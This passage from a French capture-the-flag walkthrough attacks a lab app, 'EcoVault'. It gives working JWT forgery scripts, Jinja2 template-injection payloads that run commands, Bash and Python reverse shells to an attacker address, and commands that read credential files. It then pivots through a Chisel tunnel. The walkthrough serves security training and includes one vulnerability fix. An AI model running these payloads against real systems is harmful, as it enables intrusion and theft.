#!/usr/bin/env python3
"""
forge_jwt_confusion.py — HMAC/RSA confusion attack
"""
import jwt, requests

resp = requests.get("http://ecovault.local/api/jwt-info")
public_key = resp.json()["public_key"]

payload = {"user_id": 1, "email": "admin@ecovault.com", "role": "admin"}

# On signe avec HS256 en utilisant la clé PUBLIQUE comme secret
token = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Token forgé (HMAC/RSA confusion):\n{token}")
```

```bash
# Exécute le script pour générer un token JWT par confusion HMAC/RSA
python3 forge_jwt_confusion.py
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `python3` | Interpréteur Python 3 |
| `forge_jwt_confusion.py` | Script qui forge un token en exploitant la confusion entre HMAC et RSA |

**Méthode C : Kid Injection**

```python
# Sauvegarder ce script sous forge_jwt_kid.py :
#!/usr/bin/env python3
"""
forge_jwt_kid.py — Kid injection avec /dev/null
"""
import jwt

payload = {"user_id": 1, "email": "admin@ecovault.com", "role": "admin"}
token = jwt.encode(payload, "", algorithm="HS256", headers={"kid": "/dev/null"})
print(f"Token forgé (kid injection):\n{token}")
```

```bash
# Exécute le script pour générer un JWT avec injection kid
python3 forge_jwt_kid.py
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `python3` | Interpréteur Python 3 |
| `forge_jwt_kid.py` | Script qui forge un token en exploitant l'injection du paramètre `kid` |

**Étape 5 — Tester le token forgé**

```bash
# Stocke le token forgé (ici avec alg:none) dans une variable
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9."

# Teste le token forgé sur l'endpoint admin
# -b "token=$TOKEN" : envoie le token JWT comme cookie
# | jq . : formate la réponse JSON pour une meilleure lisibilité
curl -X GET http://ecovault.local/admin/debug \
  -b "token=$TOKEN" | jq .
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `TOKEN="..."` | Variable contenant le JWT forgé (header.payload.signature) |
| `curl -X GET` | Requête HTTP GET vers l'endpoint admin |
| `-b "token=$TOKEN"` | Envoie le JWT forgé comme cookie HTTP nommé `token` |
| `\| jq .` | Pipe vers `jq` : formateur/coloriseur JSON pour une lecture humaine |
| `http://ecovault.local/admin/debug` | Endpoint réservé aux admins qui retourne les infos de debug + le flag |

**Réponse attendue (Flag 3) :**

```json
{
    "internal_hosts": ["10.0.0.10:8081", "10.0.0.10:25"],
    "hint": "Le serveur SMTP interne contient un message avec un token",
    "flag_admin": "flag{jwt_admin_forge_c3a8e1}"
}
```

**Flag obtenu :** `flag{jwt_admin_forge_c3a8e1}`

**Étape 6 — Vérifier l'accès à l'interface admin**

```bash
# Vérifie que le token admin forgé donne accès à l'interface d'administration
# L'endpoint /admin/templates est protégé par le rôle 'admin'
# Si la réponse n'est pas 403, le contournement JWT a fonctionné
curl -X GET http://ecovault.local/admin/templates \
  -b "token=$TOKEN"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl -X GET` | Requête HTTP GET pour vérifier l'accès à l'interface admin |
| `-b "token=$TOKEN"` | Envoie le JWT forgé comme cookie d'authentification |
| `/admin/templates` | Endpoint d'administration vulnérable à la SSTI (Flag 4) — nécessite le rôle admin |

#### 4.3.5 Pourquoi ça marche

**None Algorithm :** Le serveur accepte les tokens avec `"alg": "none"` et désactive la vérification de signature. La bibliothèque JWT mal configurée fait confiance au header.

```python
# ⚠️ Code vulnérable — Accepte l'algorithme 'none' et désactive la vérification de signature
# jwt.get_unverified_header() : lit le header SANS vérifier la signature (dangereux)
# options={"verify_signature": False} : désactive la vérification → n'importe quel token est accepté
if header.get('alg') == 'none':
    return jwt.decode(token, options={"verify_signature": False})
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `header.get('alg')` | Récupère l'algorithme depuis le header JWT (contrôlé par l'attaquant) |
| `== 'none'` | Si l'algorithme est `'none'`, le serveur désactive la vérification de signature |
| `options={"verify_signature": False}` | **Faille** : désactive la vérification cryptographique — le JWT est accepté sans signature valide |

**HMAC/RSA Confusion :** Le serveur expose sa clé publique (nécessaire pour vérifier les signatures RSA). L'attaquant utilise cette même clé publique comme secret HMAC. Puisque le serveur accepte à la fois `RS256` et `HS256`, il vérifie le token avec la clé publique en mode HMAC → la signature est valide.

**Kid Injection :** Le paramètre `kid` (Key ID) dans le header est utilisé pour charger une clé depuis un fichier. En pointant `kid` vers `/dev/null`, la clé devient une chaîne vide → l'attaquant signe avec une chaîne vide.

#### 4.3.6 Alternative avec jwt_tool

```bash
# Installation de jwt_tool depuis GitHub
git clone https://github.com/ticarpi/jwt_tool.git  # Clone le dépôt officiel de l'outil
cd jwt_tool                                         # Se place dans le répertoire de l'outil
pip3 install -r requirements.txt                    # Installe les dépendances Python (requests, pyjwt, etc.)

# Analyse complète d'un token JWT (détection des vulnérabilités)
python3 jwt_tool.py $TOKEN                          # Analyse le JWT et propose des tests d'attaque

# Test none algorithm (-X a) : forge un token avec alg=none
# -I : mode interactif, -pc role : claim à modifier, -pv admin : nouvelle valeur
python3 jwt_tool.py $TOKEN -X a -I -pc role -pv admin

# Test kid injection (-X k) : exploite le paramètre kid
# -kc ../../../dev/null : chemin de fichier pour la clé (null byte / null file)
python3 jwt_tool.py $TOKEN -X k -kc ../../../dev/null
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `git clone` | Clone le dépôt GitHub de l'outil jwt_tool |
| `cd jwt_tool` | Se déplace dans le répertoire de l'outil |
| `pip3 install -r requirements.txt` | Installe les dépendances Python nécessaires |
| `jwt_tool.py $TOKEN` | Analyse le JWT : décode le header/payload et suggère des attaques |
| `-X a` | Mode d'attaque "none algorithm" |
| `-I` | Mode interactif (permet de choisir les claims à modifier) |
| `-pc role` | Spécifie le claim (payload claim) à modifier |
| `-pv admin` | Nouvelle valeur pour le claim modifié |
| `-X k` | Mode d'attaque "kid injection" |
| `-kc ../../../dev/null` | Chemin de fichier pointant vers /dev/null pour la clé |

---

### 4.4 Flag 4 — SSTI → RCE (T1190 → T1059.003)

#### 4.4.1 Technique

**Server-Side Template Injection (SSTI)** dans le moteur Jinja2 (Python/Flask). L'attaquant injecte du code template qui est interprété par le serveur. En remontant la chaîne d'héritage des objets Python, il atteint le module `os` et exécute des commandes système (RCE). Il obtient un reverse shell pour interagir avec le serveur.

#### 4.4.2 Tag MITRE ATT&CK

| ID | Nom | Tactique |
|----|-----|----------|
| **T1190** | Exploit Public-Facing Application | Initial Access (TA0001) |
| **T1059.003** | Command and Scripting Interpreter: Unix Shell | Execution (TA0002) |

**Description** : L'attaquant enchaîne une SSTI (exploitation d'une application exposée) avec une exécution de commande shell via les globals Python.

#### 4.4.3 Outils nécessaires

- `curl` pour les payloads SSTI
- `nc` (netcat) pour le reverse shell listener
- `python3` pour le serveur HTTP d'exfiltration (optionnel)

#### 4.4.4 Marche à suivre

**Étape 1 — Détection de la SSTI**

```bash
# Test SSTI (Server-Side Template Injection) avec une expression mathématique simple
# {{7*7}} : syntaxe Jinja2 évaluée par le moteur de template côté serveur
# -s : mode silencieux (désactive la barre de progression)
# Si la réponse contient "49", la SSTI est confirmée
curl -s http://ecovault.local/admin/templates \
  -b "token=$TOKEN_ADMIN" \
  -d "template={{7*7}}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `curl -s` | Requête HTTP silencieuse (sans barre de progression) |
| `/admin/templates` | Endpoint qui interprète les templates Jinja2 (vulnérable SSTI) |
| `-b "token=$TOKEN_ADMIN"` | Envoie le JWT admin forgé comme cookie d'authentification |
| `-d "template={{7*7}}"` | Payload SSTI : expression mathématique 7×7 → doit retourner "49" si le moteur de template est actif |
| `{{7*7}}` | Syntaxe Jinja2 qui exécute le calcul côté serveur ; "49" dans la réponse confirme la vulnérabilité |

**Résultat attendu si SSTI Jinja2 :** la réponse contient `49` (le calcul a été effectué par le moteur).

**Étape 2 — Confirmer Jinja2**

```bash
# Test spécifique Jinja2 : concaténation de chaîne
# {{7*'7'}} : en Jinja2, multiplier un entier par une chaîne = concaténation (77)
# En Twig (PHP), '7' serait converti en entier 7 → résultat 49
# Ce test permet de distinguer Jinja2 des autres moteurs de template
curl -s http://ecovault.local/admin/templates \
  -b "token=$TOKEN_ADMIN" \
  -d "template={{7*'7'}}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `{{7*'7'}}` | Test de comportement : Jinja2 concatène (77), Twig convertit en entier (49) |
| Résultat `77` | Confirme que le moteur est Jinja2 (Python) et non Twig (PHP) |

**Résultat attendu :** `77` (Jinja2 traite `'7'` comme une chaîne et fait la concaténation). Avec Twig (PHP), le résultat serait `49` (conversion implicite en entier).

**Étape 3 — Afficher la configuration Flask**

```bash
# {{config}} : variable Jinja2/Flask qui contient toute la configuration de l'application Flask
# Inclut : SECRET_KEY, URI de base de données, tokens API, mots de passe
# C'est une étape classique de reconnaissance après confirmation de la SSTI
curl -s http://ecovault.local/admin/templates \
  -b "token=$TOKEN_ADMIN" \
  -d "template={{config}}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `{{config}}` | Objet de configuration Flask contenant SECRET_KEY, SQLALCHEMY_DATABASE_URI, etc. |
| Intérêt | Permet de récupérer les secrets de l'application avant de passer à l'exécution de commandes (RCE) |

**Résultat :** affiche la configuration Flask avec la SECRET_KEY, l'URI de base de données, etc. Cela confirme l'accès aux objets Python internes.

**Étape 4 — Exécution de commande simple**

```bash
# RCE (Remote Code Execution) via SSTI Jinja2
# Chaîne d'accès aux objets Python internes via l'objet global cycler :
#   cycler → objet Jinja2 disponible globalement dans les templates
#   .__init__ → constructeur de l'objet
#   .__globals__ → dictionnaire des variables globales du module (contient os)
#   .os → module 'os' importé dans le module Jinja2
#   .popen('id') → exécute la commande 'id'
#   .read() → lit la sortie de la commande
curl -s http://ecovault.local/admin/templates \
  -b "token=$TOKEN_ADMIN" \
  -d "template={{ cycler.__init__.__globals__.os.popen('id').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `cycler` | Objet Jinja2 disponible par défaut dans les templates Flask, point d'entrée pour la RCE |
| `.__init__` | Accède à la méthode constructeur de l'objet `cycler` |
| `.__globals__` | Dictionnaire des variables globales du module Python contenant l'import `os` |
| `.os.popen('id').read()` | Exécute la commande shell `id` et lit le résultat |
| Résultat attendu | `uid=1000(app) gid=1000(app) groups=1000(app)` — la RCE est confirmée |

**Explication de la chaîne d'accès originale :**

```
cycler                    → objet Jinja2 accessible globalement
  .__init__               → méthode constructeur de l'objet
    .__globals__          → dictionnaire des globals du module Python
      .os                 → module 'os' importé dans le module
        .popen('id')      → exécute la commande 'id'
          .read()         → lit la sortie de la commande
```

**Résultat attendu :** `uid=1000(app) gid=1000(app) groups=1000(app)`

**Étape 5 — Obtenir un reverse shell (Flag 4)**

**Terminal 1 — Sur la machine attaquante :**

```bash
# Lancer un listener netcat sur le port 4444
# -l : mode écoute (listen), -v : verbeux, -n : pas de DNS, -p 4444 : port d'écoute
nc -lvnp 4444
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `nc` (netcat) | Outil réseau polyvalent pour lire/écrire sur des connexions TCP/UDP |
| `-l` | Mode listen : écoute les connexions entrantes |
| `-v` | Mode verbeux : affiche les informations de connexion |
| `-n` | Pas de résolution DNS (plus rapide, évite les fuites DNS) |
| `-p 4444` | Port d'écoute pour la connexion entrante du reverse shell |

**Terminal 2 — Dans l'injection SSTI :**

```bash
# Reverse shell Bash : ouvre une connexion TCP vers l'attaquant et redirige les flux
# bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
# bash -i : shell interactif, >& /dev/tcp/IP/PORT : redirige stdout/stderr vers le socket
# 0>&1 : redirige stdin vers stdout (les commandes arrivent au shell depuis le socket)
curl -s http://ecovault.local/admin/templates \
  -b "token=$TOKEN_ADMIN" \
  -d "template={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `bash -c "..."` | Exécute la commande shell passée en argument |
| `bash -i` | Lance un shell interactif (avec invite de commande) |
| `>& /dev/tcp/10.0.0.1/4444` | Redirige stdout et stderr vers le socket TCP (fonctionnalité intégrée de Bash) |
| `0>&1` | Redirige stdin vers stdout (les commandes de l'attaquant arrivent au shell) |
| Adresse IP `10.0.0.1` | IP de la machine attaquante à adapter selon le réseau du lab |
| Port `4444` | Port du listener nc en écoute sur la machine attaquante |
| `/dev/tcp/...` | Pseudo-périphérique Bash qui crée une connexion TCP (feature de bash, pas un vrai fichier) |

**Si le reverse shell ne fonctionne pas** (bash non disponible), essayer avec Python :

```bash
# Reverse shell Python : plus fiable que Bash (ne dépend pas de /dev/tcp)
# import socket,subprocess,os : modules Python pour la connexion réseau et l'exécution
# s=socket.socket() : crée un socket TCP
# s.connect(("10.0.0.1",4444)) : se connecte au listener attaquant
# os.dup2(s.fileno(),N) : duplique le socket vers stdin(0), stdout(1), stderr(2)
# subprocess.call(["/bin/sh","-i"]) : lance un shell interactif relié au socket
# Les \\\" sont des échappements pour les guillemets imbriqués (payload dans payload)
curl -s http://ecovault.local/admin/templates \
  -b "token=$TOKEN_ADMIN" \
  -d "template={{ cycler.__init__.__globals__.os.popen('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.0.0.1\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"').read() }}"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `python3 -c "..."` | Exécute le code Python passé en argument |
| `socket.socket()` | Crée un socket TCP |
| `s.connect(("10.0.0.1", 4444))` | Connecte le socket au listener de l'attaquant (IP et port) |
| `os.dup2(s.fileno(), 0)` | Redirige stdin (fd 0) vers le socket |
| `os.dup2(s.fileno(), 1)` | Redirige stdout (fd 1) vers le socket |
| `os.dup2(s.fileno(), 2)` | Redirige stderr (fd 2) vers le socket |
| `subprocess.call(["/bin/sh","-i"])` | Lance un shell interactif (`/bin/sh -i`) dont les flux passent par le socket |
| Avantage | Plus fiable que le reverse shell Bash car ne dépend pas de `/dev/tcp` (disponible sur plus de systèmes) |
| `\\\"` | Échappement des guillemets dans le payload SSTI (guillemet dans une chaîne dans une chaîne) |

**Étape 6 — Lire le flag depuis le shell**

Une fois le reverse shell obtenu :

```bash
# Dans le shell réversé : exploration et capture du flag
id                  # Affiche l'utilisateur courant (uid, gid, groupes) — www-data
hostname            # Affiche le nom de la machine (conteneur Docker, permet de s'orienter)
cat /app/flag.txt   # Lit le fichier contenant le flag (stocké dans le répertoire de l'application)
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `id` | Identité de l'utilisateur : www-data (utilisateur par défaut du serveur web) |
| `hostname` | Nom d'hôte du conteneur (permet de s'orienter dans le réseau interne) |
| `cat /app/flag.txt` | Lecture du fichier flag stocké dans le répertoire de l'application |
| Flag | `flag{ssti_rce_shell_f7c3d9}` |

**Flag obtenu :** `flag{ssti_rce_shell_f7c3d9}`

**Étape 7 — Exploration du serveur**

```bash
# Structure de l'application : liste les fichiers (scripts, templates, config)
ls -la /app/

# Codes sources : analyse du code principal de l'application Flask
cat /app/app.py

# Variables d'environnement : contient souvent des secrets (clés API, mots de passe)
env

# Fichiers de configuration : base de données, clés secrètes, tokens
cat /app/config.py
cat /app/.env
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `ls -la /app/` | Liste détaillée (y compris fichiers cachés) du répertoire de l'application |
| `cat /app/app.py` | Affiche le code source principal de l'application Flask (vulnérabilités, endpoints) |
| `env` | Affiche toutes les variables d'environnement (souvent : SECRET_KEY, mots de passe BDD, tokens API) |
| `cat /app/config.py` | Fichier de configuration de l'application Flask |
| `cat /app/.env` | Fichier .env contenant les variables sensibles en clair |

#### 4.4.5 Pourquoi ça marche

Le code vulnérable ressemble à :

```python
from flask import Flask, request, render_template_string

@app.route('/admin/templates', methods=['POST'])
def admin_templates():
    template = request.form.get('template', '')
    # ⚠️ render_template_string interprète le template sans aucun échappement
    # L'attaquant peut injecter du code Jinja2 via le paramètre 'template'
    # {{ cycler.__init__.__globals__.os.popen('cmd').read() }} permet la RCE
    return render_template_string(template)
```

**Explication du code vulnérable :**

| Élément | Rôle/Explication |
|---------|------------------|
| `render_template_string(template)` | **Faille** : interprète la chaîne utilisateur comme un template Jinja2 sans aucune vérification |
| `request.form.get('template', '')` | Récupère directement la saisie utilisateur sans filtrage ni validation |
| `from flask import render_template_string` | Import de la fonction qui exécute le rendu de templates à partir d'une chaîne |
| Risque | L'attaquant peut exécuter du code Python arbitraire via les globals Jinja2 (`cycler.__init__.__globals__.os.popen()`) |
| Correction | (1) Utiliser un template fixe et passer la saisie comme variable. (2) Utiliser `render_template("preview.html", content=template)` au lieu de `render_template_string()`. (3) Ne JAMAIS utiliser `render_template_string()` avec une entrée utilisateur |

**Correction :** Ne jamais utiliser `render_template_string()` ou `render_template()` avec une saisie utilisateur. Utiliser `Template(template).render()` avec un sandbox ou passer les variables comme paramètres :

```python
# CORRECTION : utiliser un template fixe et passer la saisie comme variable
# render_template("preview.html", content=template) charge le fichier preview.html
# et passe 'template' comme variable accessible dans le fichier via {{ content }}
# Ainsi, la saisie utilisateur n'est jamais interprétée comme du code Jinja2
return render_template("preview.html", content=template)
```

**Explication de la correction :**

| Élément | Rôle/Explication |
|---------|------------------|
| `render_template("preview.html", content=template)` | Utilise un fichier template fixe ; la saisie utilisateur est passée comme **variable** et non comme **code** |
| `preview.html` | Fichier template statique qui contient `{{ content }}` pour afficher la saisie sans l'interpréter |
| Principe de sécurité | Séparation stricte entre le code du template (fichier .html) et les données utilisateur (variables) |

#### 4.4.6 Payloads alternatifs

```bash
# Alternative 1 : lire un fichier directement via open() (sans passer par os.popen)
# cycler.__init__.__globals__.open() : accède à la fonction built-in open() de Python
curl -s -b "token=$TOKEN" -d "template={{ cycler.__init__.__globals__.open('/etc/passwd').read() }}" http://ecovault.local/admin/templates

# Alternative 2 : lister un répertoire avec os.listdir()
# os.listdir('/app') : retourne la liste des fichiers du répertoire /app
curl -s -b "token=$TOKEN" -d "template={{ cycler.__init__.__globals__.os.listdir('/app') }}" http://ecovault.local/admin/templates

# Alternative 3 : utiliser lipsum (un autre objet Jinja2 global) au lieu de cycler
# lipsum.__globals__['os'].popen('id').read() : même principe, objet différent
curl -s -b "token=$TOKEN" -d "template={{ lipsum.__globals__['os'].popen('id').read() }}" http://ecovault.local/admin/templates

# Alternative 4 : utiliser config.__class__ (remonte via la classe de l'objet config)
# config.__class__.__init__.__globals__['os'].popen('id').read() : troisième chemin d'accès
curl -s -b "token=$TOKEN" -d "template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}" http://ecovault.local/admin/templates
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `cycler.__init__.__globals__.open('/etc/passwd').read()` | Lit un fichier directement avec la fonction built-in `open()` (pas besoin d'`os`) |
| `cycler.__init__.__globals__.os.listdir('/app')` | Liste le contenu d'un répertoire avec `os.listdir()` |
| `lipsum.__globals__['os'].popen('id')` | Alternative avec l'objet `lipsum` (autre global Jinja2) — contourne les éventuels filtres sur `cycler` |
| `config.__class__.__init__.__globals__['os'].popen('id')` | Troisième chemin via l'objet `config` et sa classe — autre méthode si les précédentes sont bloquées |
| Intérêt des alternatives | Si l'un des objets (`cycler`) est bloqué ou supprimé par un patch, les autres peuvent encore fonctionner |

---

### 4.5 Flag 5 (Bonus) — Pivoting (T1021)

#### 4.5.1 Technique

**Pivoting** : depuis le reverse shell obtenu sur le serveur web (Flag 4), on explore le réseau interne. On découvre un serveur interne (`10.0.0.10`) qui expose des services HTTP (8081) et SMTP (25). On utilise **Chisel** pour créer un tunnel SOCKS5 et accéder à ces services depuis notre machine attaquante. On récupère un message SMTP contenant le flag.

#### 4.5.2 Tag MITRE ATT&CK

| ID | Nom | Tactique |
|----|-----|----------|
| **T1021** | Remote Services | Lateral Movement (TA0008) |
| **T1046** | Network Service Discovery | Discovery (TA0007) |
| **T1572** | Protocol Tunneling | Command and Control (TA0011) |

**Description** : L'attaquant utilise le serveur compromis comme point de pivot pour se déplacer latéralement vers d'autres machines du réseau interne.

#### 4.5.3 Outils nécessaires

- Reverse shell actif (obtenu au Flag 4)
- `chisel` (outil de tunneling) — binaires pour Linux
- `proxychains` (redirection des outils via SOCKS)
- `nmap` (scan réseau)
- `netcat` / `curl`

#### 4.5.4 Marche à suivre

**Étape 1 — Reconnaissance réseau depuis le shell**

Depuis le reverse shell :

```bash
# Voir notre IP (affiche les adresses IP de toutes les interfaces)
hostname -I

# Scan du réseau local par ping sweep (découverte des machines actives)
# for i in $(seq 1 254) : boucle sur les 254 adresses du sous-réseau /24
# ping -c 1 -W 1 : envoie 1 paquet ICMP avec timeout de 1 seconde
# grep "bytes from" : filtre les réponses positives (machine active)
# & : exécute chaque ping en arrière-plan (parallélisation)
for i in $(seq 1 254); do
    (ping -c 1 -W 1 10.0.0.$i | grep "bytes from" &)
done
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `hostname -I` | Affiche toutes les adresses IP de la machine (sans le nom d'hôte) |
| `for i in $(seq 1 254)` | Boucle sur toutes les adresses du réseau /24 (10.0.0.1 à 10.0.0.254) |
| `ping -c 1 -W 1` | Envoie 1 paquet ICMP Echo Request avec un timeout de 1 seconde |
| `grep "bytes from"` | Ne conserve que les lignes indiquant une réponse positive |
| `&` | Exécution en arrière-plan : tous les pings sont lancés en parallèle pour accélérer le scan |
| Résultat | Machines découvertes : 10.0.0.1 (attaquant/passerelle), 10.0.0.5 (serveur web actuel), 10.0.0.10 (serveur interne cible) |

**Résultat :**

```
10.0.0.1    → machine attaquante (ou passerelle)
10.0.0.5    → serveur web actuel (EC2)
10.0.0.10   → serveur interne (cible)
```

Ou avec `nmap` si disponible :

```bash
# Vérifier si nmap est installé ; sinon l'installer silencieusement
# which nmap : teste la présence de nmap dans le PATH
# || : si la commande précédente échoue, exécute l'installation
# apt-get install -y nmap : installe nmap sans confirmation
# 2>/dev/null : supprime les messages d'erreur (stderr)
which nmap || apt-get install -y nmap 2>/dev/null

# Scan des services sur 10.0.0.10 avec détection de version
# -sV : détection de version des services
# -p- : scan de tous les ports (1-65535)
# --min-rate=1000 : vitesse minimale de 1000 paquets/seconde (accélère le scan)
nmap -sV -p- 10.0.0.10 --min-rate=1000
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `which nmap` | Vérifie si l'exécutable `nmap` est présent sur le système |
| `apt-get install -y nmap` | Installe nmap automatiquement (sans interaction utilisateur) |
| `2>/dev/null` | Redirige les erreurs (stderr) vers /dev/null (installation silencieuse) |
| `nmap -sV` | Active la détection de version des services (bannir et fingerprint) |
| `-p-` | Scan de la totalité des 65535 ports TCP |
| `--min-rate=1000` | Fixe un débit minimum de 1000 paquets/s pour accélérer le scan |
| Résultat | Ports ouverts : 25/tcp (SMTP) et 8081/tcp (HTTP) |

**Résultat :**

```
10.0.0.10
  PORT     STATE  SERVICE
  25/tcp   open   smtp
  8081/tcp open   http-proxy
```

**Étape 2 — Transférer Chisel sur le serveur compromis**

**Terminal 1 (machine attaquante) :** servir le binaire chisel via HTTP

```bash
# Télécharger Chisel depuis GitHub (machine attaquante)
wget -O chisel.gz https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel.gz && chmod +x chisel

# Vérifier l'architecture du serveur cible (depuis le reverse shell)
uname -m
# Résultat probable : x86_64

# Sur la machine attaquante, lancer un serveur HTTP pour servir le binaire
python3 -m http.server 9999
```

**Terminal 2 (reverse shell) :** télécharger chisel

```bash
# Télécharger chisel depuis notre serveur HTTP
wget http://10.0.0.1:9999/chisel -O /tmp/chisel
# OU avec curl
curl -o /tmp/chisel http://10.0.0.1:9999/chisel

# Rendre exécutable
chmod +x /tmp/chisel
```

**Étape 3 — Configurer le tunnel SOCKS5**

**Terminal 1 (machine attaquante) :** lancer le serveur Chisel

```bash
# ./chisel server : lance Chisel en mode serveur
# --port 8080 : écoute sur le port 8080 pour les connexions entrantes
# --reverse : mode reverse (le client se connecte au serveur, pas l'inverse)
# --socks5 : active le proxy SOCKS5 pour router le trafic
./chisel server --port 8080 --reverse --socks5
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `./chisel` | Binaire Chisel (outil de tunneling) |
| `server` | Mode serveur : écoute les connexions entrantes des clients |
| `--port 8080` | Port d'écoute du serveur Chisel |
| `--reverse` | Mode reverse : le serveur reçoit les connexions des clients (ne nécessite pas que le client soit accessible) |
| `--socks5` | Active un proxy SOCKS5 sur le serveur (le trafic du client est tunnelisé vers le réseau cible) |

**Terminal 2 (reverse shell) :** lancer le client Chisel

```bash
# /tmp/chisel client : lance Chisel en mode client
# 10.0.0.1:8080 : adresse IP du serveur Chisel (machine attaquante) et son port
# R:socks : demande un tunnel SOCKS5 reverse (le trafic est redirigé vers le réseau du client)
/tmp/chisel client 10.0.0.1:8080 R:socks
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `client` | Mode client : se connecte au serveur Chisel |
| `10.0.0.1:8080` | Adresse et port du serveur Chisel (machine attaquante) |
| `R:socks` | Reverse SOCKS : le client Chisel (sur le serveur compromis) expose son réseau au serveur Chisel (attaquant) via un tunnel SOCKS5 |

**Architecture du tunnel :**

```
[Attaquant] ← Tunnel SOCKS5 ← [Serveur Web] ←→ [Réseau Interne 10.0.0.0/24]
   └─> proxychains curl http://10.0.0.10:8081   └─> 10.0.0.10:8081 (HTTP)
       proxychains nc -v 10.0.0.10 25               10.0.0.10:25   (SMTP)
```

**Étape 4 — Configurer proxychains**

Sur la machine attaquante, éditer `/etc/proxychains4.conf` :

```bash
# Ajouter la configuration du proxy SOCKS5 pour Chisel
sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'
```

**Étape 5 — Scanner le serveur interne via le tunnel**

```bash
# nmap à travers le tunnel SOCKS via proxychains
# proxychains : intercepte les connexions TCP et les route via le proxy SOCKS5 (Chisel)
# -sT : scan TCP Connect (seul mode compatible avec proxychains)
# -sV : détection de version des services
# -p 8081,25 : scanne uniquement les ports identifiés précédemment
proxychains nmap -sT -sV -p 8081,25 10.0.0.10

# Résultat attendu :
# 25/tcp   open  smtp     ?
# 8081/tcp open  http     ?
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `proxychains` | Préfixe qui force le trafic de l'outil à passer par le proxy SOCKS5 configuré |
| `nmap -sT` | Scan TCP Connect (complète la poignée de main TCP) — seul mode compatible avec les proxys |
| `-sV` | Détection de version des services à partir de leurs bannières |
| `-p 8081,25` | Limite le scan aux ports 8081 (HTTP) et 25 (SMTP) |
| `10.0.0.10` | Adresse IP du serveur interne (uniquement accessible via le tunnel) |

**Étape 6 — Accéder au serveur HTTP interne**

```bash
# Utiliser curl via proxychains pour accéder au serveur HTTP interne
# Tout le trafic passe par le tunnel Chisel -> serveur web compromis -> serveur interne
proxychains curl http://10.0.0.10:8081/
```

**Réponse :** page d'accueil du serveur interne EcoVault.

```bash
# Chercher des endpoints intéressants sur le serveur interne
# /flag.txt : tentative de lecture directe du flag (parfois accessible)
proxychains curl http://10.0.0.10:8081/flag.txt

# → Flag 5 directement si le fichier est accessible
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `proxychains curl` | Curl dont le trafic est redirigé via le proxy SOCKS5 de Chisel |
| `http://10.0.0.10:8081/` | Page d'accueil du serveur HTTP interne (inaccessible directement depuis l'extérieur) |
| `http://10.0.0.10:8081/flag.txt` | Tentative de récupération directe du flag (parfois mal protégé) |

**Étape 7 — Interroger le serveur SMTP**

```bash
# Connexion SMTP via netcat à travers proxychains
# nc -v : mode verbeux (affiche les bannières et les réponses du serveur)
# 10.0.0.10 25 : adresse et port SMTP du serveur interne
proxychains nc -v 10.0.0.10 25
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `proxychains nc` | Netcat dont le trafic est redirigé via le tunnel SOCKS5 |
| `-v` | Mode verbeux : affiche les bannières du serveur SMTP |
| `25` | Port SMTP standard |

**Interaction SMTP :**

```smtp
EHLO attacker       # Salutation SMTP (Extended HELO) : identifie le client
MAIL FROM:<attacker@test.com>  # Expéditeur du message (enveloppe SMTP)
RCPT TO:<admin@ecovault.com>   # Destinataire du message
DATA                # Début du corps du message (terminé par un point seul sur une ligne)
Subject: Test       # En-tête du message
.                   # Fin du message (point seul sur une ligne)
QUIT                # Fermeture de la connexion SMTP
```

**Explication des commandes SMTP :**

| Commande SMTP | Rôle/Explication |
|---------------|------------------|
| `EHLO` | Extended HELO : salutation SMTP avec annonce des extensions supportées (ESMTP) |
| `MAIL FROM:` | Définit l'expéditeur de l'enveloppe SMTP (adresse de retour) |
| `RCPT TO:` | Définit le(s) destinataire(s) du message |
| `DATA` | Débute la transmission du corps du message (headers + body) ; terminé par `CRLF.CRLF` |
| `.` | Point seul sur une ligne : marque la fin du message DATA |
| `QUIT` | Ferme la connexion SMTP |

Pour récupérer les messages stockés, on peut essayer de s'authentifier ou d'exploiter une vulnérabilité SMTP :

